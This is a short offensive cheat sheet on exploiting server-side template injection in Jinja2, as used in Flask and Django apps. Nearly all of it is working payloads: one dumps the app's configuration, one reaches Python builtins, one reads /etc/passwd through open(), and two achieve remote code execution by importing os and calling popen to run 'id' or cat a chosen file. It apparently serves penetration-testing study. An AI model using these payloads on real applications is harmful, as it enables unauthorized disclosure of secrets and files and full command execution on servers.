# Exploiting SSTI - Jinja2
***
#### Jinja is usually used in Python web frameworks such as ***Flask*** or ***Django***.
#### To build our payloads, we can use any libraries tht are already imported by the Python application. Additionally, we may be able to import additional libraries using the ***import*** statement.

### Information Disclosure
#### In order to obtain internal information about the web application for instance,  configuration details we can inject the following payload:
```
{{ config.items() }}
```
#### Also, we can use run Python code to obtain information about the web application's source code.
```
{{ self.__init__.__globals__.__builtins__ }}
```

### Local File Inclusion (LFI)
#### Using the Python's built-in function **open** to include a local file:
```
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```

### Remote Code Execution (RCE)
#### Through the functions provided by the ***os*** library, such as **system** or **popen**, in Python, it possible to exploit RCE
#### When the web application has not imported this library, we first need to import it by calling the import function.
```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat+{file}').read() }}
```
